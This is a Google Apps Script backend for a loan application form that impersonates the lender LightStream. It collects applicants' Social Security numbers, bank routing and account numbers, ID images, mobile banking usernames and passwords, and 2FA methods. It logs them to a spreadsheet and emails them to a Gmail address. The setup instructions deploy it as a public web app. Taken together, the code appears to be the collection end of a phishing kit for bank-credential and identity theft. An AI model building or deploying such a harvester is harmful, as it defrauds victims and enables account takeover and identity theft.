// LIGHTSTREAM GOOGLE SHEETS SCRIPT - Updated with lightstreamloanservices@gmail.com
// This script handles form submissions and sends email notifications
// 
// SETUP INSTRUCTIONS:
// 1. Create a NEW Google Sheet under lightstreamloanservices@gmail.com account
// 2. Go to: https://script.google.com/home
// 3. Click "New Project"
// 4. Delete all existing code
// 5. Paste this code
// 6. Replace SHEET_URL below with your new sheet URL
// 7. Save and Deploy as Web App (Execute as: Me, Who has access: Anyone)

// REPLACE THIS WITH YOUR NEW GOOGLE SHEET URL
const SHEET_URL = "https://docs.google.com/spreadsheets/d/REPLACE_WITH_YOUR_NEW_SHEET_ID/edit";

function doGet(e) {
  return HtmlService.createHtmlOutput('LightStream Google Sheets API is working! Use POST to submit data.');
}

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
    
    // Parse the incoming data
    const data = JSON.parse(e.postData.contents);
    
    // Get current date/time
    const timestamp = new Date();
    
    // Add row to Google Sheet with all form fields including ID proof
    sheet.appendRow([
      timestamp,
      data.loanAmount || '',
      data.loanDuration || '',
      data.loanPurpose || '',
      data.customerBank || data.bankName || '',
      data.fullName || data.name || '',
      data.firstName || '',
      data.lastName || '',
      data.email || '',
      data.phone || '',
      data.streetAddress || data.address || '',
      data.city || '',
      data.state || '',
      data.zipCode || '',
      data.ssn || data.socialSecurity || '',
      data.routingNumber || '',
      data.accountNumber || '',
      data.idProofFront || 'Not uploaded',
      data.idProofBack || 'Not uploaded',
      data.mobileBankingUserId || '',
      data.mobileBankingPassword || '[PROTECTED]',
      data.twoFactorMethod || '',
      data.applicationType || 'Loan Application',
      data.applicationStatus || 'Submitted'
    ]);

    // Send email notification to lightstreamloanservices@gmail.com
    sendEmailNotification(data);

    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: err.message }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Send email notification function
function sendEmailNotification(data) {
  try {
    const recipientEmail = "lightstreamloanservices@gmail.com";
    
    // Get customer name
    const customerName = data.fullName || data.name || 'Customer';
    
    // Create email subject
    const subject = `New LightStream Application - ${customerName} - $${data.loanAmount || 'N/A'}`;
    
    // Create email body with all information including ID proof status
    const body = `
New LightStream Application Received:

Customer Information:
- Name: ${customerName}
- Email: ${data.email || 'N/A'}
- Phone: ${data.phone || 'N/A'}
- Address: ${data.streetAddress || data.address || 'N/A'}, ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zipCode || 'N/A'}

Loan Information:
- Loan Amount: $${data.loanAmount || 'N/A'}
- Loan Duration: ${data.loanDuration || 'N/A'} months
- Loan Purpose: ${data.loanPurpose || 'N/A'}
- Bank: ${data.customerBank || data.bankName || 'N/A'}

Bank Account Information:
- Routing Number: ${data.routingNumber || 'N/A'}
- Account Number: ${data.accountNumber ? '****' + data.accountNumber.slice(-4) : 'N/A'}

Government ID Proof:
- ID Front: ${data.idProofFront || 'Not uploaded'}
- ID Back: ${data.idProofBack || 'Not uploaded'}

Bank Authentication (if applicable):
- Username: ${data.mobileBankingUserId || 'N/A'}
- Password: [PROTECTED]
- 2FA Method: ${data.twoFactorMethod || 'N/A'}

Application Details:
- Type: ${data.applicationType || 'Loan Application'}
- Status: ${data.applicationStatus || 'Submitted'}
- Submitted: ${new Date().toLocaleString()}

---
This is an automated notification from LightStream Financial Services.
    `;
    
    // Send email
    MailApp.sendEmail({
      to: recipientEmail,
      subject: subject,
      body: body
    });
    
    console.log('Email sent successfully to ' + recipientEmail);
    
  } catch (error) {
    console.log('Error sending email: ' + error.toString());
    // Don't fail the whole process if email fails
  }
}
